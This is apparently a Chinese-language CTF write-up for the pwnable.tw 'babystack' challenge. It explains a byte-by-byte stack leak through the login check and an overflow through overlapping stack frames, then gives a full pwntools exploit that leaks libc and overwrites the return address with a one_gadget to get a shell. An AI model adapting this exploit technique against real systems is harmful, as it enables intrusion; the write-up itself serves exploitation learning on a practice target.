## 检查

```
$ file babystack 
babystack: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, stripped
$ checksec babystack 
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

64位程序，保护全开，去符号表

## 分析

程序本身的逻辑很简单，经典的菜单题，可以选择登陆、复制和退出

## 漏洞点

首先是登陆的地方，判断输入和密码是否一样取的是输入的长度，可以轻易以0x00开头通过，但是通过之后没有什么好处，倒是可以利用login挨个字节泄漏栈上信息，也就是one by one

然后是复制的地方，做了长度限制，但是登陆函数和复制函数的栈帧是重叠的，可以参考另一题：

[pwnable-tw-applestore-利用栈平衡控制内存/#栈平衡与计算](http://0bs3rver.space/2020/11/16/pwnable-tw-applestore-%E5%88%A9%E7%94%A8%E6%A0%88%E5%B9%B3%E8%A1%A1%E6%8E%A7%E5%88%B6%E5%86%85%E5%AD%98/#%E6%A0%88%E5%B9%B3%E8%A1%A1%E4%B8%8E%E8%AE%A1%E7%AE%97)

也就是说我们可以在复制的时候规避掉`0x3f`的限制，进而覆盖主函数的栈帧

## 利用

那么整个题目的思路也就出来了，我们可以利用one by one泄漏出栈内信息，然后构建栈完成栈溢出，最后使用one_gadget完成get shell，因为直接使用\x00无法通过最后的memcmp检验，所以还是需要爆破

使用pwndbg调试的时候给开启pie的程序高效下断点：b *$rebase(偏移)

```
b*$rebase(0xf5d)
```

需要注意的是题目给的libc和我们自己的版本并不一样

```
$ strings libc_64.so.6 | grep GNU
GNU C Library (Ubuntu GLIBC 2.23-0ubuntu5) stable release version 2.23, by Roland McGrath et al.
Compiled by GNU CC version 5.4.0 20160609.
	GNU Libidn by Simon Josefsson

$ strings my_ubuntu64_libc.so | grep GNU
GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11.2) stable release version 2.23, by Roland McGrath et al.
Compiled by GNU CC version 5.4.0 20160609.
	GNU Libidn by Simon Josefsson
```

所以本地和远程我们使用的one_gadget也不一样，但是这个提醒并没有什么用，因为我又跑不通远程，淦

## exp

需要注意的是题目的password写成了passowrd ...所以说还是直接复制比较好，再就是login和copy不能在后面加上\n，所以我们需要使用sendafter

```python
#!/usr/bin/env python3
from pwn import *
import sys, time

#context(arch='amd64',os='linux',log_level='debug')
#context.log_level = 'debug'

debug = 1
if debug:
	elf = ELF("./babystack")
	libc = ELF("./my_ubuntu64_libc.so")
	io = process(elf.path)
else:
	elf = ELF("./babystack")
	libc = ELF("./libc_64.so.6")
	io = remote("chall.pwnable.tw",10205)

################################################
s = io.send                                    #
sl = io.sendline                               #
sa = io.sendafter                              #
sla = io.sendlineafter                         #
r = io.recv                                    #
rl = io.recvline                               #
ru = io.recvuntil                              #
it = io.interactive                            #
################################################

def leak_stack(len):
	mes = ""
	for i in range(len):
		for j in range(0x1,0x100):
			sla(">> ","1")
			sla("passowrd :",mes+chr(j)+"\x00")
			recv = ru("\n")
			if "Success" in recv:
				mes += chr(j)
				log.success("message: "+mes)
				sla(">> ","1") # logout
				break
	return mes

login = lambda pw : (sla(">> ","1"),sa("passowrd :",pw))
logout = lambda : sla(">> ","1")
copy = lambda strings : (sla(">> ","3"),sa("Copy :",strings)) 
quit = lambda : sla(">> ","2")

password = leak_stack(0x10)
print("password :"+str(password))
login("\x00"+"1"*0x47)
copy("1"*0x3f)
logout()
psd = leak_stack(0x10+0x8)
log.warn(len(psd[8:]))
libc_addr = u64(psd[8:].ljust(0x8, "\x00"))-9-libc.symbols['_IO_file_setbuf']
one_gadget = 0x45226
one_gadget_addr = libc_addr + one_gadget
login("\x00"+"1"*0x3f+password+'a'*0x18+p64(one_gadget_addr))
copy("1"*0x10)
quit()

io.interactive()

```



参考：

[pwnable-tw中的babystack](https://www.lyyl.online/2019/09/24/pwnable-tw%E4%B8%AD%E7%9A%84babystack/)

